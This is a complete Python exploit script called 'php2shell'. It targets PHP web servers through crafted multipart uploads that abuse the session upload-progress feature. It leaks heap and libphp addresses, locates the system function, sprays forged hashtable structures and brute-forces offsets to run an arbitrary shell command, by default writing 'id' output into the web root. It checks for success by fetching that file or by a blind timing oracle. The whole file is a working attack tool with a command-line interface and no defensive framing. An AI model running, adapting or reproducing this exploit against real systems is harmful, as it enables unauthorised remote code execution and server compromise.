#!/usr/bin/env python3
from __future__ import annotations

import argparse
import re
import socket
import ssl
import struct
import sys
import time
import urllib.parse
from collections import Counter

ZIF_OFFSET = 0x465370
DTOR_OFFSET = 0x65EB60

PTR_MIN = 0x700000000000
PTR_MAX = 0x800000000000
MAX_CMD = 256
SID = b"attacksessionid0001"

HUGE_MB = 12
STAGE1_FILLERS = 892
STAGE2_WINDOW = 0x20000
STAGE2_ARRAYS = 150
STAGE3_PADS = 32
HT_PAGE_OFFSET = 0x800
SPRAY_VLEN = 4071
SPRAY_COUNT = 400
SLEEP_N = 5


def _mp(parts, boundary: bytes) -> bytes:
    out = bytearray()
    for p in parts:
        out += b"--" + boundary + b"\r\n"
        out += b'Content-Disposition: form-data; name="' + p["name"].encode() + b'"'
        if p.get("filename") is not None:
            out += b'; filename="' + p["filename"].encode() + b'"'
            out += b"\r\nContent-Type: application/octet-stream"
        out += b"\r\n\r\n" + p["data"] + b"\r\n"
    out += b"--" + boundary + b"--\r\n"
    return bytes(out)


class Target:
    def __init__(self, host: str, port: int, path: str = "/index.php",
                 https: bool = False, timeout: float = 30.0):
        self.host, self.port, self.path = host, port, path
        self.https, self.timeout = https, timeout

    def _connect(self):
        last = None
        for _ in range(10):
            try:
                s = socket.create_connection((self.host, self.port), timeout=self.timeout)
                if self.https:
                    s = ssl.create_default_context().wrap_socket(s, server_hostname=self.host)
                try:
                    s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                except OSError:
                    pass
                return s
            except OSError as e:
                last = e
                time.sleep(0.3)
        raise last

    def post(self, body: bytes, boundary: bytes, read_cap: int = 1 << 20,
             timeout: float | None = None) -> bytes:
        hdr = (
            f"POST {self.path} HTTP/1.1\r\nHost: {self.host}:{self.port}\r\n"
            f"Content-Type: multipart/form-data; boundary={boundary.decode()}\r\n"
            f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n"
        ).encode()
        s = self._connect()
        s.settimeout(timeout or self.timeout)
        try:
            try:
                s.sendall(hdr)
                mv = memoryview(body)
                for off in range(0, len(body), 262144):
                    s.sendall(mv[off:off + 262144])
            except OSError:
                pass
            data = bytearray()
            try:
                while len(data) < read_cap:
                    chunk = s.recv(65536)
                    if not chunk:
                        break
                    data += chunk
            except OSError:
                pass
            return bytes(data)
        finally:
            s.close()

    def get(self, path: str, read_cap: int = 1 << 20) -> tuple[int, bytes]:
        hdr = (f"GET {path} HTTP/1.1\r\nHost: {self.host}:{self.port}\r\n"
               "Connection: close\r\n\r\n").encode()
        s = self._connect()
        s.settimeout(self.timeout)
        try:
            s.sendall(hdr)
            data = bytearray()
            try:
                while len(data) < read_cap:
                    chunk = s.recv(65536)
                    if not chunk:
                        break
                    data += chunk
            except OSError:
                pass
        finally:
            s.close()
        head, _, body = bytes(data).partition(b"\r\n\r\n")
        m = re.match(rb"HTTP/1\.[01] (\d{3})", head)
        return (int(m.group(1)) if m else 0), body


def _cookie(resp: bytes) -> bytes:
    m = re.search(rb"Set-Cookie: PHPSESSID=([^\r\n]*?); path=/", resp)
    return urllib.parse.unquote_to_bytes(m.group(1).decode("latin1")) if m else b""


def _chunk_base(raw: bytes) -> int:
    if len(raw) < 1000:
        return 0
    c: Counter[int] = Counter()
    for i in range(len(raw) - 8):
        v = int.from_bytes(raw[i:i + 8], "little")
        if PTR_MIN <= v < PTR_MAX:
            c[v & ~0x1FFFFF] += 1
    if not c:
        return 0
    base, n = c.most_common(1)[0]
    return base if n >= 8 else 0


def _libphp_base(raw: bytes, dtor_off: int) -> int:
    if len(raw) < 16:
        return 0
    c: Counter[int] = Counter()
    for i in range(0, len(raw) - 8, 8):
        v = int.from_bytes(raw[i:i + 8], "little")
        if PTR_MIN <= v < PTR_MAX and (v - dtor_off) % 0x1000 == 0:
            c[v] += 1
    if not c:
        return 0
    ptr, n = c.most_common(1)[0]
    return (ptr - dtor_off) if n >= 4 else 0


class Exploit:
    def __init__(self, t: Target, cmd: bytes, zif_off: int, dtor_off: int,
                 r0_off: int, quiet: bool):
        self.t = t
        self.cmd = cmd
        self.zif_off, self.dtor_off, self.r0_off = zif_off, dtor_off, r0_off
        self.fillers = STAGE1_FILLERS
        self.quiet = quiet

    def log(self, s: str) -> None:
        if not self.quiet:
            print(s, flush=True)

    def _file(self):
        return {"name": "f", "filename": "a.txt", "data": b"A" * 64}

    def _oom(self):
        return {"name": "big", "data": b"B" * (HUGE_MB * 1024 * 1024)}

    def _trigger(self, pads_name="p", pads=STAGE3_PADS):
        parts = [{"name": "PHPSESSID", "data": b"a" * 19},
                 {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"}]
        for i in range(pads):
            parts.append({"name": f"{pads_name}{i:06d}"[:7], "data": b"V" * 7})
        parts += [self._file(), self._oom()]
        self.t.post(_mp(parts, b"S" * 17), b"S" * 17, read_cap=1 << 20,
                    timeout=max(90.0, self.t.timeout))
        time.sleep(0.3)

    def rotate(self):
        parts = [{"name": f"f{i:04d}"[:5], "data": b"V" * 3000} for i in range(1001)]
        parts += [{"name": "PHPSESSID", "data": b"\x00"},
                  {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
                  self._file(), self._oom()]
        self.t.post(_mp(parts, b"S" * 17), b"S" * 17, read_cap=1 << 20,
                    timeout=max(90.0, self.t.timeout))
        time.sleep(0.3)
        self.t.post(_mp([{"name": "PHPSESSID", "data": SID},
                         {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"}],
                        b"BNDRY12345"), b"BNDRY12345", read_cap=65536, timeout=20.0)
        time.sleep(0.5)

    def _leak_request(self, window: int, arrays: int) -> bytes:
        parts = [{"name": f"p{i:04d}", "data": b"x"} for i in range(1001)]
        parts += [{"name": "PHPSESSID", "data": b"\x00"},
                  {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
                  self._file(), self._oom()]
        self.t.post(_mp(parts, b"S" * 17), b"S" * 17, read_cap=1 << 20,
                    timeout=max(90.0, self.t.timeout))
        time.sleep(0.2)

        parts = [{"name": "PHPSESSID", "data": SID},
                 {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"}]
        for i in range(self.fillers):
            parts.append({"name": str(1000 + i),
                          "data": (f"v{i:04d}" + "x" * 44)[:48].encode()})
        forge = bytearray(b"A" * 79)
        struct.pack_into("<Q", forge, 0x10, window)
        forge[0x18] = ord("L")
        parts.append({"name": "1999", "data": bytes(forge)})
        for i in range(arrays):
            parts.append({"name": f"a{i:04d}[0]", "data": b"x"})
        return _cookie(self.t.post(_mp(parts, b"B" * 10), b"B" * 10, read_cap=9 << 20))

    def _recalibrate(self, raw: bytes) -> None:
        m = re.fullmatch(rb"v(\d{4})x+", raw)
        if m:
            idx = int(m.group(1))
            if idx and idx != self.fillers:
                self.fillers = idx
                self.log(f"[*] fillers    self-calibrated to {idx}")

    def stage1(self) -> int:
        raw = self._leak_request(0x1000, 0)
        chunk = _chunk_base(raw)
        if not chunk:
            self._recalibrate(raw)
        return chunk

    def stage2(self) -> int:
        raw = self._leak_request(STAGE2_WINDOW, STAGE2_ARRAYS)
        if len(raw) < 16:
            self._recalibrate(raw)
            return 0
        return _libphp_base(raw, self.dtor_off)

    def _payload(self, htdata: int, zif: int) -> bytes:
        cmd = self.cmd
        ht = bytearray(0x98 + len(cmd) + 1)
        struct.pack_into("<II", ht, 0x00, 1, 7)
        struct.pack_into("<II", ht, 0x08, 0x10, 0xFFFFFFF8)
        struct.pack_into("<Q", ht, 0x10, htdata + 0x20)
        struct.pack_into("<II", ht, 0x18, 1, 1)
        struct.pack_into("<II", ht, 0x20, 8, 0)
        struct.pack_into("<Q", ht, 0x30, zif)
        E = 0x20
        struct.pack_into("<I", ht, E + 0x08, 6)
        struct.pack_into("<Q", ht, E + 0x10, zif)
        struct.pack_into("<I", ht, E + 0x2C, 1)
        struct.pack_into("<Q", ht, E + 0x50, htdata + 0x80)
        struct.pack_into("<I", ht, E + 0x58, 6)
        struct.pack_into("<II", ht, 0x80, 1, 0x106)
        struct.pack_into("<Q", ht, 0x90, len(cmd))
        ht[0x98:0x98 + len(cmd)] = cmd
        return bytes(ht)

    def _spray_value(self, idx: int, htdata: int, ht: bytes,
                     ref_off: int, ht_off: int) -> bytes:
        buf = bytearray(b"." * SPRAY_VLEN)
        buf[0:8] = b"SPRAY%03d" % (idx % 1000)
        struct.pack_into("<II", buf, ref_off, 1, 10)
        struct.pack_into("<Q", buf, ref_off + 0x08, htdata)
        struct.pack_into("<Q", buf, ref_off + 0x10, 0x307)
        struct.pack_into("<Q", buf, ref_off + 0x18, 0)
        buf[ht_off:ht_off + len(ht)] = ht
        return bytes(buf)

    def stage3(self, chunk: int, zif: int) -> None:
        page = (chunk + self.r0_off) & ~0xFFF
        htdata = page + HT_PAGE_OFFSET
        ref_off = (self.r0_off & 0xFFF) - 0x18
        ht_off = HT_PAGE_OFFSET - 0x18
        ht = self._payload(htdata, zif)

        self._trigger()
        parts = [{"name": "PHPSESSID", "data": SID},
                 {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"}]
        for i in range(SPRAY_COUNT):
            parts.append({"name": f"s{i:03d}",
                          "data": self._spray_value(i, htdata, ht, ref_off, ht_off)})
        self.t.post(_mp(parts, b"B" * 10), b"B" * 10, read_cap=65536, timeout=30.0)

    def _packed_value(self, page: int, zif: int, lowbits) -> bytes:
        htdata = page + HT_PAGE_OFFSET
        ht = self._payload(htdata, zif)
        buf = bytearray(b"." * SPRAY_VLEN)
        for low in lowbits:
            ro = (low & 0xFFF) - 0x18
            if ro < 0 or ro + 0x20 > SPRAY_VLEN or (HT_PAGE_OFFSET - 0x18) <= ro < HT_PAGE_OFFSET - 0x18 + len(ht):
                continue
            struct.pack_into("<II", buf, ro, 1, 10)
            struct.pack_into("<Q", buf, ro + 0x08, htdata)
            struct.pack_into("<Q", buf, ro + 0x10, 0x307)
            struct.pack_into("<Q", buf, ro + 0x18, 0)
        buf[HT_PAGE_OFFSET - 0x18:HT_PAGE_OFFSET - 0x18 + len(ht)] = ht
        return bytes(buf)

    def stage3_packed(self, chunk: int, zif: int, page_off: int, lowbits) -> None:
        page = (chunk + page_off) & ~0xFFF
        val = self._packed_value(page, zif, lowbits)
        self._trigger()
        parts = [{"name": "PHPSESSID", "data": SID},
                 {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"}]
        for i in range(SPRAY_COUNT):
            parts.append({"name": f"s{i:03d}", "data": val})
        self.t.post(_mp(parts, b"B" * 10), b"B" * 10, read_cap=65536, timeout=30.0)


_TTY = sys.stdout.isatty()


def _c(code, s):
    return "\033[%sm%s\033[0m" % (code, s) if _TTY else s


def banner(title):
    line = "═" * 58
    print(_c("96", "╔" + line + "╗"))
    print(_c("96", "║") + _c("1;97", " " + title.ljust(56)) + _c("96", "║"))
    print(_c("96", "╚" + line + "╝"))


def hexdump(data, length=256, base=0, ptr_lo=PTR_MIN, ptr_hi=PTR_MAX):
    out = []
    n = min(len(data), length)
    for off in range(0, n, 16):
        row = data[off:off + 16]
        cells = []
        for j, b in enumerate(row):
            cell = "%02x" % b
            k = off + j
            if k % 8 == 0 and k + 8 <= len(data):
                w = int.from_bytes(data[k:k + 8], "little")
                if ptr_lo <= w < ptr_hi:
                    cells.append(_c("93", cell))
                    continue
            cells.append(cell)
        left = " ".join(cells[:8])
        right = " ".join(cells[8:16])
        asci = "".join(chr(b) if 32 <= b < 127 else "." for b in row)
        out.append("  %s  %-23s  %-23s  %s%s%s"
                   % (_c("90", "%08x" % (base + off)), left, right,
                      _c("90", "|"), asci, _c("90", "|")))
    return "\n".join(out)


class Progress:
    def __init__(self, total, label="sweep"):
        self.total, self.label, self.t0 = total, label, time.time()

    def update(self, i, extra=""):
        frac = i / self.total if self.total else 1.0
        w = 30
        filled = int(frac * w)
        bar = _c("92", "█" * filled) + _c("90", "░" * (w - filled))
        el = time.time() - self.t0
        eta = (el / i * (self.total - i)) if i else 0.0
        msg = "  %s [%s] %d/%d %3d%%  %s  %s%.0fs ETA %.0fs%s" % (
            _c("1;96", self.label), bar, i, self.total, int(frac * 100),
            extra, _c("90", ""), el, eta, _c("0", ""))
        if _TTY:
            sys.stdout.write("\r\033[K" + msg)
            sys.stdout.flush()
        elif i == self.total or i % 10 == 0:
            print(msg)

    def done(self):
        if _TTY:
            sys.stdout.write("\n")
            sys.stdout.flush()


def confirm(t, fetch):
    try:
        st, body = t.get(fetch)
        if st == 200 and body.strip():
            return body.decode("latin1", "replace").strip()
    except Exception:
        pass
    return ""


def leak_once(ex, retries):
    ex.rotate()
    chunk = 0
    for _ in range(retries):
        chunk = ex.stage1()
        if chunk:
            break
        ex.rotate()
    if not chunk:
        return 0, 0, b""
    raw = ex._leak_request(STAGE2_WINDOW, STAGE2_ARRAYS)
    libphp = _libphp_base(raw, ex.dtor_off)
    tries = 0
    while not libphp and tries < retries:
        ex.rotate()
        raw = ex._leak_request(STAGE2_WINDOW, STAGE2_ARRAYS)
        libphp = _libphp_base(raw, ex.dtor_off)
        tries += 1
    return chunk, libphp, raw


def main():
    ap = argparse.ArgumentParser(
        description="php2shell RCE with brute-force r0 discovery")
    ap.add_argument("--host", required=True)
    ap.add_argument("--port", type=int, default=80)
    ap.add_argument("--cmd", default="id>/var/www/html/pwn.txt")
    ap.add_argument("--fetch", default="/pwn.txt")
    ap.add_argument("--sleep-oracle", action="store_true")
    ap.add_argument("--timeout", type=float, default=30.0)
    ap.add_argument("--path", default="/index.php")
    ap.add_argument("--https", action="store_true")
    ap.add_argument("--zif-offset", type=lambda x: int(x, 0), default=ZIF_OFFSET)
    ap.add_argument("--dtor-offset", type=lambda x: int(x, 0), default=DTOR_OFFSET)
    ap.add_argument("--r0-lo", type=lambda x: int(x, 0), default=0x50000)
    ap.add_argument("--r0-hi", type=lambda x: int(x, 0), default=0xC0000)
    ap.add_argument("--r0-step", type=lambda x: int(x, 0), default=0x1000)
    ap.add_argument("--r0-lowbits", default="0x160,0x100,0x130,0x190")
    ap.add_argument("--leak-retries", type=int, default=3)
    ap.add_argument("--releak-every", type=int, default=24)
    ap.add_argument("--thorough", action="store_true")
    a = ap.parse_args()

    if not a.sleep_oracle and not a.fetch:
        ap.error("need a success oracle: --fetch <path>, or --sleep-oracle")

    if a.sleep_oracle:
        cmd = "sleep %d" % SLEEP_N
        if a.cmd and a.cmd != "id>/var/www/html/pwn.txt":
            cmd += "; " + a.cmd
    else:
        cmd = a.cmd
    if len(cmd.encode()) > MAX_CMD:
        ap.error("command exceeds %d bytes" % MAX_CMD)

    lowbits = [int(x, 0) for x in a.r0_lowbits.split(",")]
    pages = list(range(a.r0_lo, a.r0_hi, a.r0_step))
    t = Target(a.host, a.port, path=a.path, https=a.https, timeout=a.timeout)

    oracle = ("sleep-%ds (blind timing)" % SLEEP_N) if a.sleep_oracle else ("fetch %s" % a.fetch)
    banner("php2shell")
    print("  %s %s:%d%s" % (_c("1;97", "target "), a.host, a.port, a.path))
    print("  %s %r" % (_c("1;97", "command"), cmd))
    print("  %s %s" % (_c("1;97", "oracle "), oracle))
    print("  %s %d pages × %d low-bits  (0x%x..0x%x, lowbits %s)%s"
          % (_c("1;97", "sweep  "), len(pages), len(lowbits), a.r0_lo, a.r0_hi,
             a.r0_lowbits, "  [packed]" if not a.thorough else "  [thorough]"))
    print()
    t0 = time.time()

    ex = Exploit(t, cmd.encode(), a.zif_offset, a.dtor_offset, 0, quiet=True)

    print(_c("1;96", "  [1] infoleak"))
    chunk, libphp, raw = leak_once(ex, a.leak_retries)
    if not chunk or not libphp:
        print(_c("91", "  leak failed (worker not single-prefork, or dtor offset wrong)"),
              file=sys.stderr)
        return 1
    zif = libphp + a.zif_offset
    print(hexdump(raw, 160))
    print("  %s chunk base 0x%x   libphp base 0x%x   %s 0x%x"
          % (_c("92", "✓"), chunk, libphp, _c("1;97", "zif_system"), zif))
    print()

    if a.thorough:
        order = [(p, lb) for p in pages for lb in lowbits]
    else:
        order = [(p, None) for p in pages]
    print(_c("1;96", "  [2] r0 sweep"))

    baseline = None
    if a.sleep_oracle:
        d0 = time.time()
        try:
            ex.stage3_packed(chunk, zif, 0x8000, lowbits)
        except OSError:
            pass
        baseline = time.time() - d0
        print("  %s baseline %.1fs -> hit threshold %.1fs"
              % (_c("90", "timing:"), baseline, baseline + SLEEP_N * 0.5))

    bar = Progress(len(order), "reclaim")
    hit_r0 = None
    proof = ""
    for n, (page_off, lb) in enumerate(order, 1):
        d0 = time.time()
        try:
            if a.thorough:
                ex.r0_off = (page_off & ~0xFFF) | lb
                ex.stage3(chunk, zif)
            else:
                ex.stage3_packed(chunk, zif, page_off, lowbits)
        except OSError:
            pass
        dur = time.time() - d0

        if a.sleep_oracle:
            baseline = min(baseline, dur) if baseline else dur
            thr = baseline + SLEEP_N * 0.5
            hit = dur >= thr
            if hit:
                proof = "blind HIT: stage3 %.1fs >= %.1fs (sleep %ds executed)" % (dur, thr, SLEEP_N)
            extra = _c("93", "page 0x%05x %.1fs" % (page_off & 0xFFFFF, dur))
        else:
            time.sleep(0.5)
            proof = confirm(t, a.fetch)
            hit = bool(proof)
            extra = _c("93", "page 0x%05x" % (page_off & 0xFFFFF))

        bar.update(n, extra=extra)
        if hit:
            bar.done()
            hit_r0 = (page_off & ~0xFFF) | (lb if lb is not None else lowbits[0])
            break
        if not a.thorough and a.releak_every and n % a.releak_every == 0:
            c2, l2, _ = leak_once(ex, a.leak_retries)
            if c2 and l2:
                chunk, libphp, zif = c2, l2, l2 + a.zif_offset
    else:
        bar.done()

    if hit_r0 is not None:
        banner("RCE  ·  r0 = 0x%x  ·  %.1fs" % (hit_r0, time.time() - t0))
        print("  %s %s" % (_c("1;92", "PROOF"), _c("92", proof)))
        print("  %s exploit.py --host %s --port %d --cmd <c> --r0-offset 0x%x"
              % (_c("90", "reuse:"), a.host, a.port, hit_r0))
        return 0

    print(_c("91", "\n  no r0 in the swept range; widen --r0-lo/--r0-hi or --r0-lowbits"),
          file=sys.stderr)
    return 1


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        print()
        sys.exit(130)
